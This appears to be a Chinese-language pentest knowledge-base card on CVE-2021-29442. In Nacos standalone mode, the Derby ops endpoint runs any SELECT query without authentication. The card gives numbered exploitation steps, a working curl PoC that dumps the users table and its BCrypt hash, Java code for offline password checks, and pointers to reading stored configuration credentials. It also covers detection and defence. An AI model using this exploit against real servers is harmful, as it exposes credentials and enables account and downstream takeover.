---
id: web-java-component-nacos-derby-ops-unauth-sqli-user-dump
title: Nacos /v1/cs/ops/derby 未授权 SQL 查询（CVE-2021-29442）：select 开头即执行，导出用户表与 BCrypt 口令
type: scenario
domain: web
path: web/java/component
technique: nacos-derby-ops-unauth-sql-query
tags:
- nacos
- java
- derby
- sqli
- unauthorized-access
- credential-leak
- component
cve:
- CVE-2021-29442
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: <= 1.4.0（默认配置部署）
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:08:01+08:00'
  notes: 已对照原文与全部35张图核对：1.4.0 standalone启动（图25）、/v1/cs/ops/derby?sql=select * from users 未授权返回USERS/PASSWORD/ENABLED（图26）、derbyOps无@Secured且仅select前缀+ROWS FETCH NEXT补limit（图27）、isEmbeddedStorage=standalone（图28-30）、1.4.1加@Secured(ActionTypes.READ,resource=nacos/admin)（图31）、开启鉴权后403 unknown user（图32）均一致。affected_versions按原文'<=1.4.0默认配置部署'保留。已修正'BCrypt哈希直接用于伪造登录'为爆破出明文后登录。未验证点：未实际请求目标。
url: /docs/web/java/component/web-java-component-nacos-derby-ops-unauth-sqli-user-dump/
draft: false
kb_aliases:
- CVE-2021-29442
- Nacos Derby 未授权
- /nacos/v1/cs/ops/derby
- Nacos Derby SQL 注入
- Nacos 用户表导出
- CNVD-2020-67618
---

## 一句话结论

Nacos <= 1.4.0 在默认配置（standalone、嵌入式 Derby）下，`/nacos/v1/cs/ops/derby?sql=...` 路由没有任何访问控制；`derbyOps` 只要求 SQL 字符串以 `select` 开头，随后直接 `JdbcTemplate.queryForList(sql)` 查询内存型 Derby 数据库。攻击者未授权即可执行任意 SELECT，导出 `users` 表的用户名与 BCrypt 口令哈希；口令加密方式公开，可离线校验/爆破，爆破出明文后再登录控制台。

## 原理

- 嵌入式 Derby 是 Nacos standalone 模式的默认存储，仅能通过程序内部访问，因此开发者提供了 `/derby` 运维查询接口；但在 1.4.0 及之前，该接口没有加任何鉴权注解（`@Secured`）。
- `RequestMappingInfo.derbyOps` 的第一个判断是 `PropertyUtil.isEmbeddedStorage()`，其值来自 `ApplicationUtils.getStandaloneMode()`——standalone 启动时为 true，直接进入查询分支；集群模式返回 "The current storage mode is not Derby"。
- 第二个判断只用 `StringUtils.startsWithIgnoreCase(sql, "select")` 检查是否以 select 开头，并通过 `containsIgnoreCase(sql, "ROWS FETCH NEXT")` 自动补 `OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY` 限制行数；除此之外不做语法/表名/权限限制，然后 `JdbcTemplate.queryForList` 执行。
- 由于查询直接落到 Derby，攻击者可读 `users`、`config_info`、`tenant_info` 等表；`users` 中 `PASSWORD` 是 BCrypt 哈希（`$2a$10$...`），Nacos 自带 `PasswordEncoderUtil` 开源、算法公开，可离线校验候选口令。
- 为什么成立：运维接口把“能连内存数据库”当作安全边界，却没有认证/授权；SQL 只做前缀检查，无法阻止 `select * from users` 之类的任意读取。
- 边界：仅 standalone/嵌入式 Derby 生效；1.4.1 给该接口加了 `@Secured(action=ActionTypes.READ, resource="nacos/admin")`，开启鉴权后未授权请求返回 403 `unknown user!`；集群模式使用外部 MySQL 时该接口返回非 Derby 存储错误。原文另提到后续所谓“Nacos 最新 0day”也利用同一接口（见 Derby RCE 卡）。

## 触发条件

- Nacos 版本 <= 1.4.0，或该路由未被鉴权保护。
- 以 standalone 模式 + 默认嵌入式 Derby 启动（`PropertyUtil.isEmbeddedStorage()` 为 true）。
- 8848 端口或反代 `/nacos` 可从攻击者网络访问。
- 仅用于授权测试。

## 利用步骤

1. 确认 Nacos 入口与版本（控制台页脚/响应头/`/nacos/v1/console/server/state` 等）。
2. 发送 `GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20`。
3. 若返回 `{"code":200,...,"data":[{"USERNAME":"nacos","PASSWORD":"$2a$10$...","ENABLED":true}]}`，确认未授权查询。
4. 扩展查询：`select * from config_info` 读取配置内容（可能含下游凭据）、`select * from tenant_info` 等。
5. 对拿到的 BCrypt 哈希用 Nacos 公开的 `BCryptPasswordEncoder.matches(raw, encoded)` 或 hashcat 做离线校验/爆破。
6. 记录证据；不要执行写操作（本接口只允许 select 前缀，但可读数据已足以造成泄露）。

## PoC

```bash
curl -XGET "http://127.0.0.1:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20"
```

响应示例：

```json
{"code":200,"message":null,"data":[{"USERNAME":"nacos","PASSWORD":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu","ENABLED":true}]}
```

离线校验 BCrypt（Nacos 自带工具类）：

```java
new org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder()
    .matches("nacos", "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu");
```

修复后同一请求返回：

```json
{"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!","path":"/nacos/v1/cs/ops/derby"}
```

## 变体与关联

- **Derby RCE**：同一未授权接口 + `/v1/cs/ops/data/removal` 导入 SQL 可进一步执行 `sqlj.install_jar`/`create type external` 实现 RCE，见 [[web-java-component-nacos-derby-removal-sqlj-install-jar-rce]]。
- **默认鉴权关闭**：`nacos.core.auth.enabled=false` 时更多管理 API 暴露，见 [[web-java-component-nacos-default-auth-disabled-user-admin]]。
- **默认 JWT 密钥**：开启鉴权但未换默认密钥时仍可伪造 token 访问，见 [[web-java-component-nacos-default-token-secret-key-jwt-forge]]。
- **配置中心凭据泄露**：`config_info` 常含数据库/对象存储凭据，后续横向见 [[pentest-lateral-movement-nacos-ua-bypass-config-minio-credentials]]、[[cloud-cloud-iam-nacos-config-aliyun-ak-sk-oss-takeover]]。
- **边界**：原文表述“后上周所谓最新 0day 也用同一接口”指 2023-2024 年公开的 Nacos Derby 利用，环境为 2.3.2 standalone；本卡只覆盖 SELECT 读取。

## 检测与防御

- **检测**：访问日志中出现 `/nacos/v1/cs/ops/derby` 及 `sql=select` 参数；异常 IP 读取 users/config_info；同一来源短时间内枚举多张表。
- **防御**：升级到 1.4.1+ 并为该接口加 `@Secured` 管理员权限；开启 `nacos.core.auth.enabled=true` 并修改默认密钥；不要在公网暴露 8848；生产使用外部数据库/集群模式并不能替代鉴权。
- **审计**：检查 `users` 表是否有异常新增账号，轮换可能泄露的数据库/下游凭据。
